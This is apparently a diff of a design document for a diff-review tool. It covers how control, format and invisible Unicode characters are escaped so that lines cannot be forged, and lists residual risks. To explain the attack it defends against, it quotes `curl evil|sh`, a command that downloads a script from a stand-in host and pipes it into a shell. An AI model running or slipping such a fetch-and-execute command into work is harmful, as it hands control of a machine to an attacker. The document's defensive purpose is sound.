@@ -87,15 +87,17 @@ Checked against `main` (`a290700`):
   header and no hunk: both sides are then shown byte for byte, as lenient UTF-8, after a line
   `# <path>: shown byte for byte, as its two sides read alike as text`.
 
-- **No line passes for another.** Lines are split at `\n` only, as git splits them, but an editor also breaks lines
-  at `\r`, `\v`, `\f`, U+0085, U+2028 and U+2029: a raw `+ok\rcurl evil|sh` would show `curl evil|sh` on a line of its
-  own, without its `+`, or forge a `#` line; an invisible character makes two lines look alike that are not. In each
-  line these are escaped as `\x..`, `\u....` or `\U........`: every control character but tab (below U+0020, U+007F,
-  U+0080 to U+009F); U+2028 and U+2029; U+FEFF, invisible yet in neither of APM's sets; every character in
-  `hidden.CRITICAL` or `hidden.WARNING`. `\x..` is kept for code points below U+0080 and for bytes that cannot be
-  decoded, all from 0x80, and every other character is `\u....` or `\U........`: a stray 0xAD and a soft hyphen would
-  both read `\xad`. A typed `\x1b` still reads the same as an escaped ESC, on the same line or on another. So a
-  shown file holding both a backslash and a character to escape has every backslash doubled, after a line
+- **No line passes for another.** Lines are split at `\n` only, as git splits them, but an editor also breaks lines at
+  `\r`, `\v`, `\f`, U+0085, U+2028 and U+2029: a raw `+ok\rcurl evil|sh` would show `curl evil|sh` on a line of its own,
+  without its `+`, or forge a `#` line; an invisible character makes two lines look alike that are not. In each line
+  these are escaped as `\x..`, `\u....` or `\U........`: every character but tab of the Unicode categories `Cc`, `Cf`,
+  `Zl` and `Zp` (controls, format characters such as U+FEFF and U+180E, which neither of APM's sets holds, and the line
+  and paragraph separators), read from `unicodedata` once, on the first diff; every character in `hidden.CRITICAL` or
+  `hidden.WARNING`, whose variation selectors are no format characters. A category, unlike a list, cannot fall behind a
+  new invisible character. `\x..` is kept for code points below U+0080 and for bytes that cannot be decoded, all from
+  0x80, and every other character is `\u....` or `\U........`: a stray 0xAD and a soft hyphen would both read `\xad`. A
+  typed `\x1b` still reads the same as an escaped ESC, on the same line or on another. So a shown file holding both a
+  backslash and a character to escape has every backslash doubled, after a line
   `# <path>: each backslash shown doubled, so no typed escape reads as one`; other files keep single backslashes, as
   they read better.
 
@@ -223,6 +225,9 @@ Checked against `main` (`a290700`):
   again.
 - \[Two `ref`s that deploy the same **Hull** both pass `--expect`\] → the lock records a `ref` the review did not name;
   the agent still gets exactly what was vetted.
+- \[An invisible character outside those categories, such as U+3164 or U+2800, which Unicode files as a letter or
+  symbol, shows raw\] → no rule by category reaches it, nor does the **Hidden character** check; a seeded fuzz test
+  holds the rest: no raw character of those categories, and no two different one-line files read alike.
 - [A binary file shows as lines of escapes] → bounded by 1 MB, and **Skills** rarely hold binaries; hiding one is the
   worse failure.
 - [A hand-edited lock can make the old side look unchanged] → the lock is the user's own file; editing it hides
